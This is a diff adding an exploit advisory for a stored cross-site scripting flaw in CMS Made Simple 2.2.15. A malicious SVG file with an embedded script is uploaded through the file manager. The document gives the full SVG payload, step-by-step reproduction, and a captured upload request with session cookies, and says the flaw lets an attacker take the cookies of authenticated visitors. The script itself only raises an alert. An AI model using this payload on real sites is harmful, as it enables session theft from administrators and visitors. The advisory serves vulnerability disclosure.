@@ -1,0 +1,92 @@
+# Exploit Title: CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)
+# Date: 04/12/2020
+# Exploit Author: Eshan Singh
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: https://www.cmsmadesimple.org/downloads
+# Version:  cmsms v2.2.15
+# Tested on: Windows/Kali Linux/Ubuntu
+
+Description
+----------------------
+CMS Made Simple 2.2.15 allows an authenticated user with access to the
+Content Manager to edit content and put persistent XSS payload using the
+malicious SVG file. The user can get cookies from every authenticated user
+who visits the website.
+
+SVG Payload
+-------------
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
+http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400
+"/>
+<script type="text/javascript">
+alert(document.domain);
+</script>
+</svg>
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/SVG_XSS.svg
+
+
+Steps to reproduce
+-------------------
+1. Login into the cmsms admin panel using the admin user.
+2. then go to content > file manager > images, now upload the malicious svg
+(
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/SVG_XSS.svg)
+file.
+3. now open the svg file location (
+http://127.0.0.1/cmsms/uploads//images/SVG_XSS.svg) and BOOM! you got the
+popup.
+
+Burp Request
+-------------
+
+POST /cmsms/admin/moduleinterface.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0)
+Gecko/20100101 Firefox/83.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data;
+boundary=---------------------------379224531139948695983200896304
+Content-Length: 1040
+Origin: http://127.0.0.1
+Connection: close
+Cookie:
+a3c9a2f9998cdfdc410fef5f094579cb8f2f3306=c36ffe152373337eee92ec4985172db8528361bf%3A%3AeyJ1aWQiOjEsInVzZXJuYW1lIjoicjB4NHIiLCJlZmZfdWlkIjpudWxsLCJlZmZfdXNlcm5hbWUiOm51bGwsImhhc2giOiIkMnkkMTAkbElVM2FsR2l6UkR0dG5ROHJPVVwvd3V3M3hXano1M0wzYW9pVUhxT2pWQW4xaHNPNjZDLm9HIn0%3D;
+__c=3d8ee0fbb464e874e82; CMSSESSID5d26ee9cb371=b1gen2isn6vf4g1sal7jdt5upv
+
+-----------------------------379224531139948695983200896304
+Content-Disposition: form-data; name="mact"
+
+FileManager,m1_,upload,0
+-----------------------------379224531139948695983200896304
+Content-Disposition: form-data; name="__c"
+
+3d8ee0fbb464e874e82
+-----------------------------379224531139948695983200896304
+Content-Disposition: form-data; name="disable_buffer"
+
+1
+-----------------------------379224531139948695983200896304
+Content-Disposition: form-data; name="m1_files[]"; filename="SVG_XSS.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "
+http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900"
+stroke="#004400"/>
+   <script type="text/javascript">
+      alert(document.domain);
+   </script>
+</svg>
+-----------------------------379224531139948695983200896304--
